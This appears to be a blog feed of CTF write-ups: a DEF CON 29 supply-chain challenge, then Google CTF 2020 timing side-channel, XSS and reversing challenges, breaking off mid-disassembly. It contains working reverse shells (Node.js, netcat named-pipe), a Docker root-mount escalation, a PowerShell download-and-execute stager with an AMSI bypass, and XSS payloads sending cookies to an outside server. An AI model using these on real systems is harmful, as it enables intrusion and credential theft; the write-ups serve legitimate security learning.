function\">spawn</span><span class=\"token punctuation\">(</span><span class=\"token string\">'cmd.exe'</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        sh <span class=\"token operator\">=</span> <span class=\"token function\">spawn</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/bin/sh'</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    client<span class=\"token punctuation\">.</span><span class=\"token function\">pipe</span><span class=\"token punctuation\">(</span>sh<span class=\"token punctuation\">.</span>stdin<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    sh<span class=\"token punctuation\">.</span>stdout<span class=\"token punctuation\">.</span><span class=\"token function\">pipe</span><span class=\"token punctuation\">(</span>client<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    sh<span class=\"token punctuation\">.</span>stderr<span class=\"token punctuation\">.</span><span class=\"token function\">pipe</span><span class=\"token punctuation\">(</span>client<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    sh<span class=\"token punctuation\">.</span><span class=\"token function\">on</span><span class=\"token punctuation\">(</span><span class=\"token string\">'exit'</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">code<span class=\"token punctuation\">,</span>signal</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre>\n<p>Building takes several minutes, so we should be able to modify the file before it's too late. The IP points to my cloud server where a netcat listener is waiting for either a Linux or Windows client to connect on port 53. In the previous boxes, DNS port 53 was the most successful at getting through the firewalls. On the cloud Ubuntu host, I had to use <code>systemctl</code> to kill <code>resolvd</code> so that I could bind to port 53.</p>\n<p>After watching the progress of the Electron build, we downloaded the newly built Electron apps from <code>lunarfire.dev</code>, checked for the modified code and then validated the signatures. Great! AppVeyor has in fact packaged and signed our malicious code and we are on the way to performing a supply chain attack.</p>\n<p>Now we need to wait for a target to download and run the malicious apps.</p>\n<p>By viewing the log file <code>/var/log/supervisor/lunarfire_stdout.log</code> (log of port 80 HTTP connections), we saw repeated connections from our target, fetching the signatures and the Windows exe about every 15 minutes.</p>\n<pre><code>09:43:17 [INFO] GET /artifacts/SHA256SUMS:\n09:43:17 [INFO] Matched: GET /artifacts/&lt;name&gt; (artifact)\n09:43:17 [INFO] 3.93.70.55:50462 - SHA256SUMS\n09:43:17 [INFO] Outcome: Success\n09:43:17 [INFO] Response succeeded.\n...\n</code></pre>\n<p>This is the machine which will run our compromised app. We don't know which machine this is, but it is downloading the <code>Wuphf-win-1.7.2.exe</code>. We had previously obtained the C# source code of the auto-updater.</p>\n<p>Unfortunately, before we'd started working on this box, the updater had died. It stopped polling our lunarfire at 09:43 UTC. That left us a bit stuck and unable to proceed with the CTF until we managed to get assistance from the admins at 16:35 UTC.</p>\n<h2 id=\"rooting-lunarfire\" tabindex=\"-1\">Rooting LunarFire <a class=\"header-anchor\" href=\"https://blog.caller.xyz/defcon29-rtv-ctf/\">#</a></h2>\n<p>In the meantime, I tried modifying the <code>ci.sh</code> to get a shell in the build pipeline by adding</p>\n<pre class=\"language-sh\" tabindex=\"0\"><code class=\"language-sh\"><span class=\"token function\">rm</span> <span class=\"token parameter variable\">-f</span> /tmp/aaa<span class=\"token punctuation\">;</span> <span class=\"token function\">mknod</span> /tmp/aaa p<span class=\"token punctuation\">;</span> /bin/sh <span class=\"token operator\"><span class=\"token file-descriptor important\">0</span>&lt;</span>/tmp/aaa <span class=\"token operator\">|</span> <span class=\"token function\">nc</span> <span class=\"token number\">10.0</span>.40.70 <span class=\"token number\">4444</span> <span class=\"token operator\"><span class=\"token file-descriptor important\">1</span>></span>/tmp/aaa</code></pre>\n<p>I then tried the above <code>while</code> loop to modify the file, but it didn't work immediately. <code>build/electron.js</code> worked because <code>electron.js</code> can only be written to if the <code>build</code> directory already exists, i.e. cloning has started. But <code>ci.sh</code> can be written as soon as the <code>Whuphf-1-flsdkj</code> directory is created. If you put <code>ci.sh</code> there before cloning starts, cloning fails. Therefore, we had to check that <code>ci.sh</code> exists before writing it with <code>[ -f &quot;/home/AppVeyor/$XXX/ci.sh&quot; ] &amp;&amp; cat bad-ci.sh &gt; &quot;/home/AppVeyor/$XXX/ci.sh&quot;</code>.</p>\n<p>That gave us a shell as the appveyor user. Not great, except that we'd already seen that appveyor can run Docker. So let's try mounting root... <code>docker run -it --rm -v /:/myroot electronuserland/builder /bin/bash</code>... yep, now we can add public keys to <code>/myroot/root/.ssh/authorized_keys</code> and get root SSH access.</p>\n<p>This section didn't really help us with the challenge, though as we needed to pivot to the next network.</p>\n<h2 id=\"ws07-was-turned-back-on-for-us\" tabindex=\"-1\">WS07 was turned back on for us <a class=\"header-anchor\" href=\"https://blog.caller.xyz/defcon29-rtv-ctf/\">#</a></h2>\n<p>And after my netcat listener had waited for hours, our supply chain shell finally popped as <code>dundermuffin\\ryan.howard</code> on <code>WS07.dundermiffin.corp</code>, a completely new network and immediate access to flag <code>WS07 - Ryan Wuphf - user_flag.txt</code> in <code>C:\\Wuphf\\user_flag.txt</code>.</p>\n<p>Now we have one Windows <code>cmd</code> shell, or more accurately, I have one Windows shell. Sharing that one shell with the rest of Son of Anton was quite difficult and something we hadn't prepared for. We tried different Golang reverse shells but they were all being binned by Defender. My teammate's solution to sharing this box was using staged Powershell payloads. If you put the whole shell in a script and call it in a background shell with <code>Start-Job -ScriptBlock {(New-Object System.Net.WebClient).DownloadString('http://.../shell.ps1') | IEX}</code>, AMSI will prevent the script running. His genius move was a first stage Powershell script which applies an AMSI bypass, it then downloads and runs the next stage which sends the reverse shell. I imagine a proper C2 would have been the correct solution here.</p>\n<p>Anyway, it was fun playing this CTF.</p>\n",
			"date_published": "2021-08-09T00:00:00Z"
		}
		,
		{
			"id": "https://blog.caller.xyz/google-ctf-2020-writeup/",
			"url": "https://blog.caller.xyz/google-ctf-2020-writeup/",
			"title": "Google CTF 2020 Writeup",
			"content_html": "<p>The Google CTF was hard, so I don't feel so bad about only solving easy challenges. Writeup also <a href=\"https://gist.github.com/bcaller/72c860e6046ff9a287ae8364aaff21d8\">available as a Gist</a>.</p>\n<h1 id=\"tracing\" tabindex=\"-1\">Tracing <a class=\"header-anchor\" href=\"https://blog.caller.xyz/google-ctf-2020-writeup/\">#</a></h1>\n<p>Type: pwn, Points: 151, Solves: 79</p>\n<h2 id=\"intro\" tabindex=\"-1\">Intro <a class=\"header-anchor\" href=\"https://blog.caller.xyz/google-ctf-2020-writeup/\">#</a></h2>\n<p>The challenge is a contract tracing system.\nThe server plays the part of the contract tracing app which keeps a record of all IDs it has come into\ncontact with.\nThe IDs are 16 byte strings represented as UUIDs.\nIt listens on a TCP socket for connections from the health authority, which sends lists of infected IDs.\nThe server then checks whether any IDs it has recorded are infected.</p>\n<p>The challenge is to force the server to disclose its IDs - one in particular will be the flag <code>CTF{???????????}</code>.\nSince it never transmits the IDs, we need to use a side-channel attack to disclose the flag.</p>\n<h2 id=\"getting-output-from-the-server\" tabindex=\"-1\">Getting output from the server <a class=\"header-anchor\" href=\"https://blog.caller.xyz/google-ctf-2020-writeup/\">#</a></h2>\n<p>The first problem when connecting is that there's no response from the server, whatever you send to it.</p>\n<pre><code>rlwrap nc tracing.2020.ctfcompetition.com 1337\n</code></pre>\n<p>Luckily, the challenge rust code builds easily with <code>cargo build</code>, so you can run it and see the debug messages.\nUnfortunately, I still couldn't reach the line <code>debug!(&quot;Received {} IDs&quot;, count);</code> until I found out that you can hangup\njust one side of a TCP connection.\nYou can shutdown just the client-&gt;server side, and still receive data back from the server.\nIn python you can use <code>sock.shutdown(socket.SHUT_WR)</code> and this makes the server continue past the <code>await</code>.</p>\n<h2 id=\"comparison\" tabindex=\"-1\">Comparison <a class=\"header-anchor\" href=\"https://blog.caller.xyz/google-ctf-2020-writeup/\">#</a></h2>\n<p>When sent a list of IDs via the TCP socket, the server first builds a binary search tree (BST).\nFor each ID the server has recorded, it searches for it within the BST.</p>\n<h3 id=\"bst\" tabindex=\"-1\">BST <a class=\"header-anchor\" href=\"https://blog.caller.xyz/google-ctf-2020-writeup/\">#</a></h3>\n<p>Let's imagine the IDs are single bytes rather than 16 bytes.\nIf the server receives infected IDs 25,20,30,15,27,23,55,41,67,29,24,21,10,17,26 you will end up with this beautiful balanced BST:</p>\n<pre><code>                 25\n          ______/  \\______\n         /                \\\n        20                30\n     /     \\          /       \\\n   15       23       27       55\n  /  \\     /  \\     /  \\     /  \\\n 10  17   21  24   26  29   41  67\n</code></pre>\n<p>If the server wants to check whether 28 exists within the BST, it walks down from the root.</p>\n<ul>\n<li>28 &gt; 25 (right)</li>\n<li>28 &lt; 30 (left)</li>\n<li>28 &gt; 27 (right)</li>\n<li>28 &lt; 29 (left, not found)</li>\n</ul>\n<p>For a balanced binary search tree the lookup takes time <code>O(log(n))</code>. However, the server builds a binary search tree which isn't necessarily\nbalanced. The resulting tree depends on the order which the IDs are received.</p>\n<p>If the IDs are received in the order 10,15,17,20,21,23,24,25,26,27,29,30,41,55,67 then the BST will be super unbalanced:</p>\n<pre><code>10\n \\\n  15\n   \\\n    17\n     \\\n      20\n      ...\n</code></pre>\n<p>A lookup for 8 will only require comparison with the root (8 &lt; 10) since there's nothing on the left.</p>\n<p>A lookup for 70, will require comparisons with each item of the tree (70 &gt; 10, 70 &gt; 15, 70 &gt; 17) giving the worst case\nlookup of <code>O(n)</code>.</p>\n<h2 id=\"leaking-ids\" tabindex=\"-1\">Leaking IDs <a class=\"header-anchor\" href=\"https://blog.caller.xyz/google-ctf-2020-writeup/\">#</a></h2>\n<p>Since we, playing the role of the evil health authority, control the infected IDs sent to the server, we control the shape of the BST.\nBy forcing a very unbalanced BST, the lookup takes much longer if the ID is on one side of the root node than the other.</p>\n<p>If we guess a possible alphabet of <code>!#$+-0123456789:&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ^_abcdefghijklmnopqrstuvwxyz</code>, then\nto determine the character after <code>CTF{</code> we start in the middle with letter Q: bisection method.</p>\n<p>Send the root <code>CTF{Q!!!!!!!!!!}</code> followed by 7000 IDs as far to the right as possible to produce a tree like:</p>\n<pre><code>CTF{Q!!!!!!!!!!}\n                 CTF{zzzzzzzzzzz}\n              CTF{zzzzzzzzzzy}\n           CTF{zzzzzzzzzzx}\n        CTF{zzzzzzzzzzw}\n     CTF{zzzzzzzzzzv}\n  CTF{zzzzzzzzzzu}\n  ...\n</code></pre>\n<p>Then shutdown the write side of the connection and time the duration until the server closes the connection.</p>\n<pre class=\"language-python\" tabindex=\"0\"><code class=\"language-python\"><span class=\"token keyword\">def</span> <span class=\"token function\">run</span><span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">,</span> prefix<span class=\"token punctuation\">,</span> suffix<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">,</span> increase<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">assert</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">16</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">,</span> prefix<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">,</span> increase<span class=\"token punctuation\">)</span>\n    sock <span class=\"token operator\">=</span> socket<span class=\"token punctuation\">.</span>socket<span class=\"token punctuation\">(</span>socket<span class=\"token punctuation\">.</span>AF_INET<span class=\"token punctuation\">,</span> socket<span class=\"token punctuation\">.</span>SOCK_STREAM<span class=\"token punctuation\">)</span>\n    sock<span class=\"token punctuation\">.</span>connect<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token string\">'tracing.2020.ctfcompetition.com'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1337</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    sock<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n    attempts <span class=\"token operator\">=</span> <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>\n    <span class=\"token keyword\">for</span> attempt <span class=\"token keyword\">in</span> attempts<span class=\"token punctuation\">:</span>\n        sock<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>attempt<span class=\"token punctuation\">)</span>\n    sock<span class=\"token punctuation\">.</span>shutdown<span class=\"token punctuation\">(</span>socket<span class=\"token punctuation\">.</span>SHUT_WR<span class=\"token punctuation\">)</span>\n    data <span class=\"token operator\">=</span> sock<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span>\n    start <span class=\"token operator\">=</span> time<span class=\"token punctuation\">.</span>time_ns<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">while</span> data<span class=\"token punctuation\">:</span>\n        data <span class=\"token operator\">=</span> sock<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n    end <span class=\"token operator\">=</span> time<span class=\"token punctuation\">.</span>time_ns<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    sock<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    timing <span class=\"token operator\">=</span> end <span class=\"token operator\">-</span> start\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>timing<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> timing</code></pre>\n<p>If the flag is anywhere to the right of the root, the server will have to search all the way through the 7000 IDs.\nIf the flag is anywhere to the left of the root, the lookup will complete after just one comparison with the root.</p>\n<p>Then make the BST weighted to the left and compare the timings. If the right-weighted tree lookup took much longer, the\nfirst character of the flag is between <code>Q</code> and <code>z</code>: we set the midpoint to <code>h</code>.</p>\n<p>At some point later we have determined that the flag starts <code>CTF{1Bi</code> and that the next character is within <code>qrstuvwxy</code>.\nWe send a right-weighted tree and it responds in 0.02ms.</p>\n<pre><code>CTF{1Biu!!!!!!!}\n                 CTF{1Bi y zzzzzzz}\n              CTF{1Bi y zzzzzzy}\n           CTF{1Bi y zzzzzzx}\n        CTF{1Bi y zzzzzzw}\n     CTF{1Bi y zzzzzzv}\n  CTF{1Bi y zzzzzzu}\n</code></pre>\n<p>And the left-weighted tree responds in 88.6ms.</p>\n<pre><code>                 CTF{1Biuzzzzzzz}\nCTF{1Biq!!!!!!!}\n   CTF{1Biq!!!!!!#}\n      CTF{1Biq!!!!!!$}\n         CTF{1Biq!!!!!!+}\n            CTF{1Biq!!!!!!-}\n               CTF{1Biq!!!!!!0}\n</code></pre>\n<p>So we guess that the character after <code>CTF{1Bi</code> is within <code>qrstu</code> (to the left).</p>\n<p>There were some issues with getting accurate timings, especially when the midpoint was the correct letter, but with a\nbit of messing around we get the flag <code>CTF{1BitAtATime}</code>.</p>\n<p>This was a fun challenge that just requires a little computer science.</p>\n<h1 id=\"pasteurize\" tabindex=\"-1\">Pasteurize <a class=\"header-anchor\" href=\"https://blog.caller.xyz/google-ctf-2020-writeup/\">#</a></h1>\n<p>Type: web, Points: 50, Solves: 260</p>\n<p>Let's investigate the source code.</p>\n<h2 id=\"source-code\" tabindex=\"-1\">Source code <a class=\"header-anchor\" href=\"https://blog.caller.xyz/google-ctf-2020-writeup/\">#</a></h2>\n<h3 id=\"body-parser\" tabindex=\"-1\">Body parser <a class=\"header-anchor\" href=\"https://blog.caller.xyz/google-ctf-2020-writeup/\">#</a></h3>\n<pre class=\"language-js\" tabindex=\"0\"><code class=\"language-js\"><span class=\"token comment\">/* They say reCAPTCHA needs those. But does it? */</span>\napp<span class=\"token punctuation\">.</span><span class=\"token function\">use</span><span class=\"token punctuation\">(</span>bodyParser<span class=\"token punctuation\">.</span><span class=\"token function\">urlencoded</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span>\n  <span class=\"token literal-property property\">extended</span><span class=\"token operator\">:</span> <span class=\"token boolean\">true</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre>\n<p>Extended body parser allows sending arrays and objects as form params.\nYou can send <code>a=1&amp;a=2</code> which makes <code>req.body.a = [&quot;1&quot;, &quot;2&quot;]</code> (of type array instead of string as usual).</p>\n<h3 id=\"xss-in-get-note\" tabindex=\"-1\">XSS in GET note <a class=\"header-anchor\" href=\"https://blog.caller.xyz/google-ctf-2020-writeup/\">#</a></h3>\n<pre class=\"language-js\" tabindex=\"0\"><code class=\"language-js\"><span class=\"token comment\">/* Make sure to properly escape the note! */</span>\napp<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/:id([a-f0-9\\-]{36})'</span><span class=\"token punctuation\">,</span> recaptcha<span class=\"token punctuation\">.</span>middleware<span class=\"token punctuation\">.</span>render<span class=\"token punctuation\">,</span> utils<span class=\"token punctuation\">.</span>cache_mw<span class=\"token punctuation\">,</span> <span class=\"token keyword\">async</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">req<span class=\"token punctuation\">,</span> res</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">const</span> note_id <span class=\"token operator\">=</span> req<span class=\"token punctuation\">.</span>params<span class=\"token punctuation\">.</span>id<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">const</span> note <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> <span class=\"token constant\">DB</span><span class=\"token punctuation\">.</span><span class=\"token function\">get_note</span><span class=\"token punctuation\">(</span>note_id<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>note <span class=\"token operator\">==</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">return</span> res<span class=\"token punctuation\">.</span><span class=\"token function\">status</span><span class=\"token punctuation\">(</span><span class=\"token number\">404</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">send</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Paste not found or access has been denied.\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n\n  <span class=\"token keyword\">const</span> unsafe_content <span class=\"token operator\">=</span> note<span class=\"token punctuation\">.</span>content<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">const</span> safe_content <span class=\"token operator\">=</span> <span class=\"token function\">escape_string</span><span class=\"token punctuation\">(</span>unsafe_content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/***************************/</span>\n\n  res<span class=\"token punctuation\">.</span><span class=\"token function\">render</span><span class=\"token punctuation\">(</span><span class=\"token string\">'note_public'</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token literal-property property\">content</span><span class=\"token operator\">:</span> safe_content<span class=\"token punctuation\">,</span>\n    <span class=\"token literal-property property\">id</span><span class=\"token operator\">:</span> note_id<span class=\"token punctuation\">,</span>\n    <span class=\"token literal-property property\">captcha</span><span class=\"token operator\">:</span> res<span class=\"token punctuation\">.</span>recaptcha\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre>\n<p>Let's look at the critical <code>escape_string</code> method:</p>\n<pre class=\"language-js\" tabindex=\"0\"><code class=\"language-js\"><span class=\"token comment\">/* Who wants a slice? */</span>\n<span class=\"token keyword\">const</span> <span class=\"token function-variable function\">escape_string</span> <span class=\"token operator\">=</span> <span class=\"token parameter\">unsafe</span> <span class=\"token operator\">=></span> <span class=\"token constant\">JSON</span><span class=\"token punctuation\">.</span><span class=\"token function\">stringify</span><span class=\"token punctuation\">(</span>unsafe<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">slice</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token regex\"><span class=\"token regex-delimiter\">/</span><span class=\"token regex-source language-regex\">&lt;</span><span class=\"token regex-delimiter\">/</span><span class=\"token regex-flags\">g</span></span><span class=\"token punctuation\">,</span> <span class=\"token string\">'\\\\x3C'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token regex\"><span class=\"token regex-delimiter\">/</span><span class=\"token regex-source language-regex\">></span><span class=\"token regex-delimiter\">/</span><span class=\"token regex-flags\">g</span></span><span class=\"token punctuation\">,</span> <span class=\"token string\">'\\\\x3E'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre>\n<p>How does it work with strings?</p>\n<pre><code>escape_string('abc')\n'abc'\nescape_string('a&quot;b&quot;c')\n'a\\\\&quot;b\\\\&quot;c'\n</code></pre>\n<p>But because of extended bodyparser we can send arrays:</p>\n<pre><code>escape_string([])\n''\nescape_string(['a', 'b'])\n'&quot;a&quot;,&quot;b&quot;'\nescape_string([';//'])\n'&quot;;//&quot;'\n</code></pre>\n<h2 id=\"solution\" tabindex=\"-1\">Solution <a class=\"header-anchor\" href=\"https://blog.caller.xyz/google-ctf-2020-writeup/\">#</a></h2>\n<p>The output of <code>escape_string</code> ends up being served within javascript surrounded by double quotes. We can break out of the double quotes by sending an array request such as:</p>\n<pre class=\"language-bash\" tabindex=\"0\"><code class=\"language-bash\"><span class=\"token function\">curl</span> <span class=\"token parameter variable\">-L</span> https://pasteurize.web.ctfcompetition.com/ <span class=\"token punctuation\">\\</span>\n  <span class=\"token parameter variable\">--data</span> <span class=\"token string\">\"content=;function aa(d) { const e = btoa(JSON.stringify(d)); return fetch(\\<span class=\"token variable\"><span class=\"token variable\">`</span>https://myserver/<span class=\"token punctuation\">\\</span><span class=\"token variable\">`</span></span>) } aa(document.cookie);//&amp;content=x\"</span></code></pre>\n<p>The note contains html:</p>\n<pre class=\"language-html\" tabindex=\"0\"><code class=\"language-html\">    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\">\n        <span class=\"token keyword\">const</span> note <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">function</span> <span class=\"token function\">aa</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">d</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span> <span class=\"token keyword\">const</span> e <span class=\"token operator\">=</span> <span class=\"token function\">btoa</span><span class=\"token punctuation\">(</span><span class=\"token constant\">JSON</span><span class=\"token punctuation\">.</span><span class=\"token function\">stringify</span><span class=\"token punctuation\">(</span>d<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">return</span> <span class=\"token function\">fetch</span><span class=\"token punctuation\">(</span><span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">https://myserver/</span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">}</span> <span class=\"token function\">aa</span><span class=\"token punctuation\">(</span>document<span class=\"token punctuation\">.</span>cookie<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//\",\"x\"\";</span>\n        <span class=\"token keyword\">const</span> note_id <span class=\"token operator\">=</span> <span class=\"token string\">\"dc8ec4b1-0c03-4887-9e9e-b4d580759138\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">const</span> note_el <span class=\"token operator\">=</span> document<span class=\"token punctuation\">.</span><span class=\"token function\">getElementById</span><span class=\"token punctuation\">(</span><span class=\"token string\">'note-content'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">const</span> note_url_el <span class=\"token operator\">=</span> document<span class=\"token punctuation\">.</span><span class=\"token function\">getElementById</span><span class=\"token punctuation\">(</span><span class=\"token string\">'note-title'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">const</span> clean <span class=\"token operator\">=</span> DOMPurify<span class=\"token punctuation\">.</span><span class=\"token function\">sanitize</span><span class=\"token punctuation\">(</span>note<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        note_el<span class=\"token punctuation\">.</span>innerHTML <span class=\"token operator\">=</span> clean<span class=\"token punctuation\">;</span>\n        note_url_el<span class=\"token punctuation\">.</span>href <span class=\"token operator\">=</span> <span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">/</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>note_id<span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">;</span>\n        note_url_el<span class=\"token punctuation\">.</span>innerHTML <span class=\"token operator\">=</span> <span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>note_id<span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">;</span>\n    </span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span></code></pre>\n<p>Now we just share the note with TJMike🎤 and wait for his headless Chrome to report the base64-encoded cookie with flag back to your server.</p>\n<h2 id=\"extra\" tabindex=\"-1\">Extra <a class=\"header-anchor\" href=\"https://blog.caller.xyz/google-ctf-2020-writeup/\">#</a></h2>\n<p>I also tried to exploit the headless Chrome with <a href=\"https://github.com/bcaller/puppet-puncher\">puppet-puncher</a> with payload</p>\n<pre><code>content=;var ok=0;function zzq(){if(ok){return;} ok=1; function aa(d) { const e = btoa(JSON.stringify(d)); return fetch(`https://myserver/?x=${e}`) } function rs(k, s) { aa([k, s]) } Object.keys(window).filter(function(k){return typeof window[k] == 'function'}).filter(function(k){return k.indexOf('zzq') == -1}).filter(function(k){return window[k].toString().indexOf('[bindingName]') != -1}).forEach(function(k){ const f = window[k];try{f({'toString': null, '__proto__': null}).then(function(){return f()}).then(function(f){return f([-1.3e99, 'n', null], 'hi', {'toString': null})}).then(function(r){return aa([k, r])}).catch(function(e){return rs(k, e.stack)})}catch(ee){}});aa(document.cookie)};window.onload=zzq;//&amp;content=x\n</code></pre>\n<p>but no exposed functions were found.</p>\n<h1 id=\"beginner\" tabindex=\"-1\">Beginner <a class=\"header-anchor\" href=\"https://blog.caller.xyz/google-ctf-2020-writeup/\">#</a></h1>\n<p>Type: reversing, Points: 50, Solves: 482</p>\n<h2 id=\"intro-1\" tabindex=\"-1\">Intro <a class=\"header-anchor\" href=\"https://blog.caller.xyz/google-ctf-2020-writeup/\">#</a></h2>\n<p>This binary verifies if a flag is correct or not. The flag isn't inside the binary: instead you have to understand how the verification works and reverse it to make a flag which outputs <code>SUCCESS</code> instead of <code>FAILURE</code>.</p>\n<h2 id=\"disassembly\" tabindex=\"-1\">Disassembly <a class=\"header-anchor\" href=\"https://blog.caller.xyz/google-ctf-2020-writeup/\">#</a></h2>\n<p>Load it into <code>gdb</code> and <code>disas main</code>:</p>\n<pre><code>Dump of assembler code for function main:\n   0x0000000000001080 &lt;+0&gt;:     push   r12\n   0x0000000000001082 &lt;+2&gt;:     lea    rdi,[rip+0xf7b]        # 0x2004\n   0x0000000000001089 &lt;+9&gt;:     xor    eax,eax\n   0x000000000000108b &lt;+11&gt;:    push   rbp\n   0x000000000000108c &lt;+12&gt;:    sub    rsp,0x28\n   0x0000000000001090 &lt;+16&gt;:    call   0x1050 &lt;printf@plt&gt;\n   0x0000000000001095 &lt;+21&gt;:    mov    r12,rsp\n   0x0000000000001098 &lt;+24&gt;:    xor    eax,eax\n   0x000000000000109a &lt;+26&gt;:    lea    rbp,[rsp+0x10]\n   0x000000000000109f &lt;+31&gt;:    mov    rsi,r12\n   0x00000000000010a2 &lt;+34&gt;:    lea    rdi,[rip+0xf62]        # 0x200b\n   0x00000000000010a9 &lt;+41&gt;:    call   0x1060 &lt;__isoc99_scanf@plt&gt;\n   0x00000000000010ae &lt;+46&gt;:    movdqa xmm0,XMMWORD PTR [rsp]\n   0x00000000000010b3 &lt;+51&gt;:    mov    rsi,rbp\n   0x00000000000010b6 &lt;+54&gt;:    mov    rdi,r12\n   0x00000000000010b9 &lt;+57&gt;:    mov    edx,0x10\n   